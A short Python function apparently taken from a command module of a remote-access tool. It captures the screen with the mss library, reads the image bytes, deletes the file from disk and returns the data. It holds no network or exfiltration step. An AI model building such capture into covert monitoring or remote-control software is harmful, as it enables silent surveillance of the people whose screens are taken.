def execute_command():
    from mss import mss
    import os

    ## Take screenshot
    with mss() as sct:
        filename = sct.shot()

    image_path = os.path.join(os.getcwd(),filename)
    if os.path.isfile(image_path):
        content = open(image_path,"rb").read()
        os.remove(image_path)
        return content
    else:
        return False